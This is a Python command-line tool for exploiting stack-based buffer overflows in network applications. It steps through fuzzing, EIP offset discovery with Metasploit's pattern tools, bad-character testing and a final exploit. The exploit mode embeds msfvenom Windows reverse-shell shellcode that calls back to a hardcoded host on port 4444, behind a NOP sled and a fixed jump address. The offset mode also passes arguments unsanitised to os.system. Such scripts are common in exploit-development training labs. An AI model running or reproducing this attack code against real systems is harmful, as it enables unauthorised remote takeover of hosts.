#!/usr/bin/python3
import argparse
import os, sys, socket
from time import sleep

def main():
	# Process Command-Line Arguments
	parser = argparse.ArgumentParser(description = "A Python script used to assist with the binary exploitation of stack-based Buffer Overflow vulnerabilities in network-based applications.", add_help=True)

	# Create subparsers to process positional arguments that are modular dependent
	subparser = parser.add_subparsers(dest='mode', metavar='mode', help='Use <mode> -h to list addtional required and optional arguments for the selected mode.')

	spiking = subparser.add_parser('spiking', description="A Python script used exploit stack-based Buffer Overflow vulnerabilities. This module uses Spiking to test input parameters and identify potential vectors for Buffer Overflows.", help='Spike arguments to parameters to identify vulnerable inputs.')
	offset = subparser.add_parser('offset', description="A Python script used exploit stack-based Buffer Overflow vulnerabilities. This module uses Metasploits pattern_create.rb to send a unique payload to the vulnerable application and help identify the exact offset of the EIP.", help='Identify the offset of the EIP by injecting a unique payload into a vulnerable parameter.')
	eip = subparser.add_parser('eip', description="A Python script used exploit stack-based Buffer Overflow vulnerabilities. This module can be used to validate your Buffer Overflow and verify that you can intentially overwrite the EIP. If successful, the value of the EIP should be `0x42424242`.", help="Validate that you control EIP by overwritting the EIP to an expected value.")
	badchars = subparser.add_parser('badchars', description="A Python script used exploit stack-based Buffer Overflow vulnerabilities. This module can be used to identify 'Bad Characters' that should be avoided when generating your shellcode.", help="Submit a string of hexadecimal characters against the application to identify 'Bad Characters'.")
	exploit = subparser.add_parser('exploit', description="A Python script used exploit stack-based Buffer Overflow vulnerabilities. This module can be used to launch your Buffer Overflow and execute shellcode against a vulnerable application. Warning: Rememeber to manually update the script to modify the EIP and upload your custom shellcode.", help='Exploit a vulnerable application with a stack-based Buffer Overflow to execute shellcode.')

    # Positional arguments for Spiking
	spiking.add_argument("-t", "--target", type=str, required=True, help="The IP Address of your target.")
	spiking.add_argument("-p", "--port", type=int, required=True, help="The port number of the target application.")
	spiking.add_argument("-d", "--data", type=str, required=True, help="The user input to supply the application before attempting the Buffer Overflow.")

	# Positional arguments for Offset
	offset.add_argument("-t", "--target", type=str, required=True, help="The IP Address of your target.")
	offset.add_argument("-p", "--port", type=int, required=True, help="The port number of the target application.")
	offset.add_argument("-d", "--data", type=str, required=True, help="The user input to supply to the application before attempting the Buffer Overflow.")
	offset.add_argument("-l", "--length", type=str, required=True, help="The payload length to generate with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb.")

	# Positional arguments for EIP
	eip.add_argument("-t", "--target", type=str, required=True, help="The IP Address of your target.")
	eip.add_argument("-p", "--port", type=int, required=True, help="The port number of the target application.")
	eip.add_argument("-d", "--data", type=str, required=True, help="The user input to supply to the application before attempting the Buffer Overflow.")
	eip.add_argument("-o", "--offset", type=int, required=True, help="The offset of the EIP.")

	# Positional arguments for Badchars
	badchars.add_argument("-t", "--target", type=str, required=True, help="The IP Address of your target.")
	badchars.add_argument("-p", "--port", type=int, required=True, help="The port number of the target application.")
	badchars.add_argument("-d", "--data", type=str, required=True, help="The user input to supply to the application before attempting the Buffer Overflow.")
	badchars.add_argument("-o", "--offset", type=int, required=True, help="The offset of the EIP.")

	# Positional arguments for Exploit
	exploit.add_argument("-t", "--target", type=str, required=True, help="The IP Address of your target.")
	exploit.add_argument("-p", "--port", type=int, required=True, help="The port number of the target application.")
	exploit.add_argument("-d", "--data", type=str, required=True, help="The user input to supply to the application before attempting the Buffer Overflow.")
	exploit.add_argument("-o", "--offset", type=int, required=True, help="The offset of the EIP.")
	exploit.add_argument("-n", "--nop", type=int, required=False, default=16, help="The number of bytes to NOP slide before executing the shellcode.")

	args = parser.parse_args()

	if args.mode == "spiking" or args.mode == "offset" or args.mode == "eip" or args.mode == "badchars" or args.mode == "exploit":
		if args.mode == "spiking":
			spiking_module(args.target, args.port, args.data)
		elif args.mode =="offset":
			offset_module(args.target, args.port, args.data, args.length)
		elif args.mode =="eip":
			eip_module(args.target, args.port, args.data, args.offset)
		elif args.mode =="badchars":
			badchars_module(args.target, args.port, args.data, args.offset)
		elif args.mode =="exploit":
			exploit_module(args.target, args.port, args.data, args.offset, args.nop)		
	else:
		print("No module was specified! Use ./bufferoverflow.py -h to display usage options.")

def spiking_module(target, port, data):
	buffer = "A" * 100

	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			s.recv(1024)

			payload = data + buffer

			s.send((payload.encode()))
			s.recv(1024)
			s.close()
			print(f"Spiking {str(len(buffer))} bytes to {target}:{port} {data} (A * {str(len(buffer))} ...")
			sleep(1)
			buffer = buffer + "A" * 100

		except Exception as e:
			print(f"Fuzzing crashed at {str(len(buffer))}! The following exception was triggered: " + str(e))
			sys.exit()

def offset_module(target, port, data, length):
	filename = f"msf_byte_pattern_{length}"
	os.system(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length} > {filename}")

	with open(filename, 'r') as file:
		buffer = file.read()

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))

		payload = data + buffer

		s.send((payload.encode()))
		s.close()
		print(f"Sending a {length} byte payload from pattern_create.rb to {target}:{port} ...")
		sleep(1)
		print(f"Use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {length} -q [EIP] to calculate the offset of the EIP.")

	except Exception as e:
		print(f"Error connecting to the server at {target}:{port}! The following exception was caught: " + str(e))
		sys.exit()

def eip_module(target, port, data, offset):
	
	buffer = b"A" * offset + b"B" * 4

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))

		payload = data.encode() + buffer

		s.send((payload))
		s.close()
		print(f"Sent {str(len(payload))} bytes to {target}:{port}. If successful, the value of the EIP should be 0x42424242.")

	except Exception as e:
		print(f"Error connecting to the server at {target}:{port}! The following exception was caught: " + str(e))
		sys.exit()

def badchars_module(target, port, data, offset):

	badchars = b""
	badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	
	buffer = b"A" * offset + badchars

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))

		payload = data + buffer

		s.send((payload))
		s.close()
		print(f"Sent {str(len(payload))} bytes to {target}:{port}. Analyze the memory dump of the ESP to determine if any characters were unable to be interpretted by the application.")

	except Exception as e:
		print(f"Error connecting to the server at {target}:{port}! The following exception was caught: " + str(e))
		sys.exit()

def exploit_module(target, port, data, offset, nop):
	# Replace this Shellcode with your own custom payload.
	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.23 LPORT=4444 EXITFUNC=thread -f python -a x86 -b "\x00"
	buf =  b""
	buf += b"\xdb\xc3\xd9\x74\x24\xf4\x5d\xb8\x4f\x90\x40\x37"
	buf += b"\x2b\xc9\xb1\x52\x31\x45\x17\x83\xc5\x04\x03\x0a"
	buf += b"\x83\xa2\xc2\x68\x4b\xa0\x2d\x90\x8c\xc5\xa4\x75"
	buf += b"\xbd\xc5\xd3\xfe\xee\xf5\x90\x52\x03\x7d\xf4\x46"
	buf += b"\x90\xf3\xd1\x69\x11\xb9\x07\x44\xa2\x92\x74\xc7"
	buf += b"\x20\xe9\xa8\x27\x18\x22\xbd\x26\x5d\x5f\x4c\x7a"
	buf += b"\x36\x2b\xe3\x6a\x33\x61\x38\x01\x0f\x67\x38\xf6"
	buf += b"\xd8\x86\x69\xa9\x53\xd1\xa9\x48\xb7\x69\xe0\x52"
	buf += b"\xd4\x54\xba\xe9\x2e\x22\x3d\x3b\x7f\xcb\x92\x02"
	buf += b"\x4f\x3e\xea\x43\x68\xa1\x99\xbd\x8a\x5c\x9a\x7a"
	buf += b"\xf0\xba\x2f\x98\x52\x48\x97\x44\x62\x9d\x4e\x0f"
	buf += b"\x68\x6a\x04\x57\x6d\x6d\xc9\xec\x89\xe6\xec\x22"
	buf += b"\x18\xbc\xca\xe6\x40\x66\x72\xbf\x2c\xc9\x8b\xdf"
	buf += b"\x8e\xb6\x29\x94\x23\xa2\x43\xf7\x2b\x07\x6e\x07"
	buf += b"\xac\x0f\xf9\x74\x9e\x90\x51\x12\x92\x59\x7c\xe5"
	buf += b"\xd5\x73\x38\x79\x28\x7c\x39\x50\xef\x28\x69\xca"
	buf += b"\xc6\x50\xe2\x0a\xe6\x84\xa5\x5a\x48\x77\x06\x0a"
	buf += b"\x28\x27\xee\x40\xa7\x18\x0e\x6b\x6d\x31\xa5\x96"
	buf += b"\xe6\xfe\x92\x98\xe1\x96\xe0\x98\x1c\x3b\x6c\x7e"
	buf += b"\x74\xd3\x38\x29\xe1\x4a\x61\xa1\x90\x93\xbf\xcc"
	buf += b"\x93\x18\x4c\x31\x5d\xe9\x39\x21\x0a\x19\x74\x1b"
	buf += b"\x9d\x26\xa2\x33\x41\xb4\x29\xc3\x0c\xa5\xe5\x94"
	buf += b"\x59\x1b\xfc\x70\x74\x02\x56\x66\x85\xd2\x91\x22"
	buf += b"\x52\x27\x1f\xab\x17\x13\x3b\xbb\xe1\x9c\x07\xef"
	buf += b"\xbd\xca\xd1\x59\x78\xa5\x93\x33\xd2\x1a\x7a\xd3"
	buf += b"\xa3\x50\xbd\xa5\xab\xbc\x4b\x49\x1d\x69\x0a\x76"
	buf += b"\x92\xfd\x9a\x0f\xce\x9d\x65\xda\x4a\xbd\x87\xce"
	buf += b"\xa6\x56\x1e\x9b\x0a\x3b\xa1\x76\x48\x42\x22\x72"
	buf += b"\x31\xb1\x3a\xf7\x34\xfd\xfc\xe4\x44\x6e\x69\x0a"
	buf += b"\xfa\x8f\xb8"

	# Update the EIP to point to a jump instruction from a vulnerable library that will call the ESP.
	buffer = b"A" * offset + b"\xaf\x11\x50\x62" + b"\x90" * nop + buf

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))

		payload = data.encode('utf-8') + buffer

		s.send((payload))
		s.close()
		print(f"Sent {str(len(payload))} bytes to {target}:{port}. If the Buffer Overflow was successful, you should have a reverse shell.")

	except Exception as e:
		print(e)
		print(f"Error connecting to the server at {target}:{port}! The following exception was caught: " + str(e))
		sys.exit()

if __name__ == "__main__":
    main()
